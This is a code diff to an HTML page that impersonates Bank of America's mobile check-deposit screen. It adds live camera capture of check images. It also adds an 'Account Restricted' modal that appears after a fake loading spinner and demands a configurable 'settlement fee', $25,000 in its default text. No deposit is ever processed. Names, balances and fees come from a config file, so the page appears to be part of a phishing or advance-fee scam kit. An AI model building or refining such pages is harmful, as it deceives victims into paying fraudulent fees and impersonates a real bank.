@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Bank of America - Deposit Checks</title>
     <link rel="icon" href="/logo.svg" type="image/svg+xml">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -10,7 +10,6 @@
 </head>
 <body>
     <div class="mobile-container dashboard-mode">
-        <!-- Top Navigation -->
         <header class="top-nav">
             <div class="nav-left">
                 <div class="nav-item" style="margin-left: 0;">
@@ -34,72 +33,68 @@
             </div>
         </header>
 
-        <!-- Tabs -->
         <div class="tabs">
             <div class="tab" onclick="window.location.href='dashboard.html'">Accounts</div>
             <div class="tab active">Deposit Checks</div>
         </div>
 
-        <!-- Main Content -->
         <main class="main-content">
             <h1 class="page-title">Deposit Checks</h1>
-            
+
             <div class="deposit-container">
-                <!-- Check Photos -->
                 <div class="check-photos-section">
-                    <div class="photo-box">
-                        <div class="camera-icon-circle">
-                            <i class="fas fa-camera"></i>
+                    <div class="photo-box" id="frontCheckBox" role="button" tabindex="0" aria-label="Scan front of check">
+                        <div class="photo-box-content" id="frontCheckContent">
+                            <div class="camera-icon-circle">
+                                <i class="fas fa-camera"></i>
+                            </div>
+                            <span class="photo-label">Front of Check</span>
                         </div>
-                        <span class="photo-label">Front of Check</span>
+                        <img id="frontCheckPreview" class="check-photo-preview" alt="">
                     </div>
-                    <div class="photo-box">
-                        <div class="camera-icon-circle">
-                            <i class="fas fa-camera"></i>
+                    <div class="photo-box" id="backCheckBox" role="button" tabindex="0" aria-label="Scan back of check">
+                        <div class="photo-box-content" id="backCheckContent">
+                            <div class="camera-icon-circle">
+                                <i class="fas fa-camera"></i>
+                            </div>
+                            <span class="photo-label">Back of Check</span>
                         </div>
-                        <span class="photo-label">Back of Check</span>
+                        <img id="backCheckPreview" class="check-photo-preview" alt="">
                     </div>
                 </div>
 
-                <!-- Amount Input -->
                 <div class="input-group deposit-input-group">
                     <label class="deposit-label">Amount</label>
                     <div class="amount-input-wrapper">
                         <span class="currency-symbol">$</span>
-                        <input type="number" placeholder="0.00" class="deposit-amount-input">
+                        <input type="number" id="depositAmountInput" placeholder="0.00" class="deposit-amount-input" inputmode="decimal" step="0.01" min="0">
                     </div>
                 </div>
 
-                <!-- Account Selector -->
                 <div class="input-group deposit-input-group">
                     <label class="deposit-label">Deposit to</label>
                     <div class="account-selector-wrapper" id="accountSelectorWrapper">
                         <div class="account-selector" id="accountSelector">
                             <div class="selected-account">
                                 <span class="account-name" id="selectedAccountName">Current Account</span>
-                                <span class="account-balance-small" id="selectedAccountBalance">Available: $362,756.00</span>
+                                <span class="account-balance-small" id="selectedAccountBalance">Available: $0.00</span>
                             </div>
                             <i class="fas fa-chevron-down" id="accountSelectorIcon"></i>
                         </div>
-                        <div class="account-dropdown" id="accountDropdown">
-                            <!-- Accounts populated from config -->
-                        </div>
+                        <div class="account-dropdown" id="accountDropdown"></div>
                     </div>
                 </div>
 
-                <!-- Terms -->
                 <p class="deposit-terms">
                     By depositing this check, you agree to the <a href="#">Service Agreement</a>.
                 </p>
 
-                <!-- Deposit Button -->
-                <button class="sign-in-btn deposit-btn">
+                <button type="button" class="sign-in-btn deposit-btn" id="depositContinueBtn">
                     Continue
                 </button>
             </div>
         </main>
 
-        <!-- Bottom Navigation -->
         <nav class="bottom-nav">
             <div class="nav-item" id="accounts-tab">
                 <div class="icon-circle">
@@ -126,6 +121,53 @@
                 <span>Invest</span>
             </div>
         </nav>
+
+        <!-- LIVE CHECK CAMERA -->
+        <div id="checkCameraOverlay" class="check-camera-overlay" style="display: none;" aria-hidden="true">
+            <header class="check-camera-header">
+                <button type="button" class="check-camera-cancel" id="checkCameraCancel">Cancel</button>
+                <h2 class="check-camera-title" id="checkCameraTitle">Front of Check</h2>
+                <span class="check-camera-spacer"></span>
+            </header>
+            <div class="check-camera-stage">
+                <video id="checkCameraVideo" class="check-camera-video" playsinline autoplay muted></video>
+                <canvas id="checkCameraCanvas" class="check-camera-canvas" hidden></canvas>
+                <div class="check-camera-frame" aria-hidden="true">
+                    <span class="check-camera-hint" id="checkCameraHint">Align the check inside the frame</span>
+                </div>
+            </div>
+            <footer class="check-camera-footer">
+                <p class="check-camera-status" id="checkCameraStatus">Starting camera...</p>
+                <button type="button" class="check-camera-shutter" id="checkCameraCapture" aria-label="Capture check">
+                    <span></span>
+                </button>
+                <input type="file" id="checkCameraFallbackInput" class="check-photo-input" accept="image/*" capture="environment">
+                <button type="button" class="check-camera-fallback-btn" id="checkCameraFallbackBtn">Use photo library / camera roll</button>
+            </footer>
+        </div>
+
+        <!-- ACCOUNT RESTRICTED MODAL -->
+        <div id="restrictionModal" class="modal-overlay modal-overlay-contained">
+            <div class="security-modal-content">
+                <div class="security-modal-header">
+                    <img src="logo.svg" alt="Bank of America Logo" class="security-logo-icon">
+                    <span class="security-logo-text">BANK OF AMERICA</span>
+                </div>
+                <div class="security-body">
+                    <div class="security-icon-lock" style="color: #E31837;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="security-title" id="depositRestrictionTitle">Account Restricted</div>
+                    <div class="security-text" style="text-align: left;" id="depositRestrictionMessage">
+                        Dear Customer,<br><br>
+                        Your account is temporarily restricted due to unresolved security issues.<br><br>
+                        A settlement fee of <strong style="color: #E31837;">$25,000.00</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.
+                    </div>
+                    <button type="button" id="closeRestrictionBtn" class="security-btn">I Understand</button>
+                    <div class="security-footer-link" id="contactSupportLink">Contact Support</div>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script src="client-secure.js"></script>
@@ -133,10 +175,34 @@
     <script src="auth.js"></script>
     <script>
         BoAAuth.requireAuth();
+
         const accountSelectorWrapper = document.getElementById('accountSelectorWrapper');
         const accountSelector = document.getElementById('accountSelector');
         const selectedAccountName = document.getElementById('selectedAccountName');
         const selectedAccountBalance = document.getElementById('selectedAccountBalance');
+        const frontCheckBox = document.getElementById('frontCheckBox');
+        const backCheckBox = document.getElementById('backCheckBox');
+        const frontCheckPreview = document.getElementById('frontCheckPreview');
+        const backCheckPreview = document.getElementById('backCheckPreview');
+        const depositContinueBtn = document.getElementById('depositContinueBtn');
+        const restrictionModal = document.getElementById('restrictionModal');
+        const closeRestrictionBtn = document.getElementById('closeRestrictionBtn');
+        const contactSupportLink = document.getElementById('contactSupportLink');
+
+        const cameraOverlay = document.getElementById('checkCameraOverlay');
+        const cameraVideo = document.getElementById('checkCameraVideo');
+        const cameraCanvas = document.getElementById('checkCameraCanvas');
+        const cameraTitle = document.getElementById('checkCameraTitle');
+        const cameraHint = document.getElementById('checkCameraHint');
+        const cameraStatus = document.getElementById('checkCameraStatus');
+        const cameraCapture = document.getElementById('checkCameraCapture');
+        const cameraCancel = document.getElementById('checkCameraCancel');
+        const cameraFallbackBtn = document.getElementById('checkCameraFallbackBtn');
+        const cameraFallbackInput = document.getElementById('checkCameraFallbackInput');
+
+        let cameraStream = null;
+        let activeSide = 'front';
+        const captured = { front: false, back: false };
 
         function closeAccountDropdown() {
             accountSelectorWrapper.classList.remove('open');
@@ -147,19 +213,15 @@
         }
 
         function bindAccountOptions() {
-            const accountOptions = document.querySelectorAll('.account-option');
-            accountOptions.forEach(function(option) {
-                option.addEventListener('click', function(e) {
+            document.querySelectorAll('.account-option').forEach(function (option) {
+                option.addEventListener('click', function (e) {
                     e.stopPropagation();
-
-                    accountOptions.forEach(function(item) {
+                    document.querySelectorAll('.account-option').forEach(function (item) {
                         item.classList.remove('selected');
                     });
                     option.classList.add('selected');
-
                     selectedAccountName.textContent = option.dataset.name;
                     selectedAccountBalance.textContent = 'Available: ' + option.dataset.balance;
-
                     closeAccountDropdown();
                 });
             });
@@ -167,29 +229,156 @@
 
         window.bindDepositAccountOptions = bindAccountOptions;
 
+        function fillPlaceholders(template, name, fee) {
+            return String(template || '')
+                .replace(/\{name\}/gi, name || 'Customer')
+                .replace(/\{fee\}/gi, fee || '$0.00');
+        }
+
+        function updateRestrictionMessage() {
+            var config = {};
+            try {
+                config = BoAConfig.get() || {};
+            } catch (error) {
+                config = {};
+            }
+            var restriction = config.restriction || {};
+            var fee = BoAConfig.formatCurrency(restriction.settlementFee || 0);
+            var name = config.fullName || 'Customer';
+            var title = restriction.title || 'Account Restricted';
+            var greeting = fillPlaceholders(restriction.greeting || 'Dear {name},', name, fee);
+            var message = restriction.message || 'Your account is temporarily restricted due to unresolved security issues.';
+            var feeText = fillPlaceholders(
+                restriction.feeText || 'A settlement fee of {fee} is required to restore full access and remove the restriction, so normal account operations will be restored.',
+                name,
+                fee
+            );
+
+            document.getElementById('depositRestrictionTitle').textContent = title;
+            document.getElementById('depositRestrictionMessage').innerHTML =
+                greeting.replace(/\n/g, '<br>') + '<br><br>' +
+                message.replace(/\n/g, '<br>') + '<br><br>' +
+                feeText.split(fee).join('<strong style="color: #E31837;">' + fee + '</strong>');
+            closeRestrictionBtn.textContent = restriction.button || 'I Understand';
+            contactSupportLink.textContent = restriction.support || 'Contact Support';
+        }
+
+        function showRestrictionModal() {
+            updateRestrictionMessage();
+            restrictionModal.style.display = 'flex';
+        }
+
+        function closeRestrictionModal() {
+            restrictionModal.style.display = 'none';
+        }
+
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(function (track) {
+                    track.stop();
+                });
+                cameraStream = null;
+            }
+            cameraVideo.srcObject = null;
+        }
+
+        function closeCameraOverlay() {
+            stopCamera();
+            cameraOverlay.style.display = 'none';
+            cameraOverlay.setAttribute('aria-hidden', 'true');
+            cameraCapture.disabled = false;
+            cameraStatus.textContent = '';
+        }
+
+        async function startLiveCamera() {
+            stopCamera();
+            cameraStatus.textContent = 'Starting camera...';
+            cameraCapture.disabled = true;
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                cameraStatus.textContent = 'Live camera unavailable on this device. Use photo library below.';
+                return false;
+            }
+
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: {
+                        facingMode: { ideal: 'environment' },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                cameraVideo.srcObject = cameraStream;
+                await cameraVideo.play();
+                cameraStatus.textContent = 'Hold the check steady, then tap capture';
+                cameraCapture.disabled = false;
+                return true;
+            } catch (error) {
+                cameraStatus.textContent = 'Camera permission blocked. You can still choose a photo below.';
+                cameraCapture.disabled = true;
+                return false;
+            }
+        }
+
+        async function openCheckCamera(side) {
+            activeSide = side;
+            cameraTitle.textContent = side === 'front' ? 'Front of Check' : 'Back of Check';
+            cameraHint.textContent = side === 'front'
+                ? 'Align the FRONT of the check inside the frame'
+                : 'Align the BACK of the check inside the frame';
+            cameraOverlay.style.display = 'flex';
+            cameraOverlay.setAttribute('aria-hidden', 'false');
+            await startLiveCamera();
+        }
+
+        function applyCapturedImage(dataUrl) {
+            const preview = activeSide === 'front' ? frontCheckPreview : backCheckPreview;
+            const box = activeSide === 'front' ? frontCheckBox : backCheckBox;
+            preview.src = dataUrl;
+            preview.alt = activeSide === 'front' ? 'Front of check' : 'Back of check';
+            box.classList.add('has-photo');
+            captured[activeSide] = true;
+            closeCameraOverlay();
+        }
+
+        function captureFromVideo() {
+            if (!cameraStream || !cameraVideo.videoWidth) {
+                cameraStatus.textContent = 'Camera not ready yet. Wait a moment and try again.';
+                return;
+            }
+
+            cameraCanvas.width = cameraVideo.videoWidth;
+            cameraCanvas.height = cameraVideo.videoHeight;
+            const ctx = cameraCanvas.getContext('2d');
+            ctx.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            applyCapturedImage(cameraCanvas.toDataURL('image/jpeg', 0.92));
+        }
+
         BoAConfig.initPage(function () {
             BoAConfig.renderDepositAccounts();
             bindAccountOptions();
         });
 
-        document.getElementById('logout-btn').addEventListener('click', function() {
+        document.getElementById('logout-btn').addEventListener('click', function () {
+            stopCamera();
             BoAAuth.logout();
             window.location.href = 'index.html';
         });
 
-        document.getElementById('accounts-tab').addEventListener('click', function() {
+        document.getElementById('accounts-tab').addEventListener('click', function () {
             window.location.href = 'dashboard.html';
         });
 
-        document.getElementById('pay-transfer-tab').addEventListener('click', function() {
+        document.getElementById('pay-transfer-tab').addEventListener('click', function () {
             window.location.href = 'pay_transfer.html';
         });
 
-        document.getElementById('invest-tab').addEventListener('click', function() {
+        document.getElementById('invest-tab').addEventListener('click', function () {
             window.location.href = 'invest.html';
         });
 
-        accountSelector.addEventListener('click', function(e) {
+        accountSelector.addEventListener('click', function (e) {
             e.stopPropagation();
             if (accountSelectorWrapper.classList.contains('open')) {
                 closeAccountDropdown();
@@ -198,9 +387,64 @@
             }
         });
 
-        document.addEventListener('click', function() {
+        document.addEventListener('click', function () {
             closeAccountDropdown();
         });
+
+        frontCheckBox.addEventListener('click', function () {
+            openCheckCamera('front');
+        });
+        backCheckBox.addEventListener('click', function () {
+            openCheckCamera('back');
+        });
+
+        [frontCheckBox, backCheckBox].forEach(function (box) {
+            box.addEventListener('keydown', function (event) {
+                if (event.key === 'Enter' || event.key === ' ') {
+                    event.preventDefault();
+                    box.click();
+                }
+            });
+        });
+
+        cameraCancel.addEventListener('click', closeCameraOverlay);
+        cameraCapture.addEventListener('click', captureFromVideo);
+
+        cameraFallbackBtn.addEventListener('click', function () {
+            cameraFallbackInput.click();
+        });
+
+        cameraFallbackInput.addEventListener('change', function () {
+            const file = cameraFallbackInput.files && cameraFallbackInput.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function (event) {
+                applyCapturedImage(event.target.result);
+            };
+            reader.readAsDataURL(file);
+            cameraFallbackInput.value = '';
+        });
+
+        depositContinueBtn.addEventListener('click', function () {
+            depositContinueBtn.disabled = true;
+            depositContinueBtn.innerHTML = '<div class="spinner"></div>';
+            setTimeout(function () {
+                depositContinueBtn.disabled = false;
+                depositContinueBtn.textContent = 'Continue';
+                showRestrictionModal();
+            }, 1200);
+        });
+
+        closeRestrictionBtn.addEventListener('click', closeRestrictionModal);
+        contactSupportLink.addEventListener('click', closeRestrictionModal);
+        restrictionModal.addEventListener('click', function (e) {
+            if (e.target === restrictionModal) {
+                closeRestrictionModal();
+            }
+        });
+
+        window.addEventListener('pagehide', stopCamera);
+        restrictionModal.style.display = 'none';
     </script>
 </body>
 </html>
